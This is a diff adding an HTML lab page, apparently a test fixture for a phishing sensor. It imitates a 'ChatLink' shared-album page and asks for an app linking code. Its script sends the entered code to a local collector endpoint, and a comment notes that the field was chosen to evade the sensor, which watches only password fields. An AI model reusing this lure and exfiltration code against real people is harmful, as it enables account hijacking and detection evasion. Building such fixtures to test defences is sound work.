@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ChatLink - Shared album</title></head>
+<body>
+  <h1>ChatLink</h1>
+  <p style="color:#a00">LAB ATTACK PAGE - "shared photos" app-linking code scam (non-credential). Fake data only.</p>
+  <p>A friend shared 12 photos with you. Enter the linking code from your ChatLink app to view them.</p>
+
+  <input name="code" placeholder="8-digit linking code">
+  <button type="button" id="view">View album</button>
+
+  <script>
+    // The "linking code" is NOT a password field - our sensor doesn't watch it.
+    document.getElementById("view").addEventListener("click", () => {
+      const code = document.querySelector('input[name="code"]').value;
+      fetch("http://127.0.0.1:8002/collect", {
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        body: "linking_code=" + encodeURIComponent(code),
+      });
+    });
+  </script>
+</body></html>
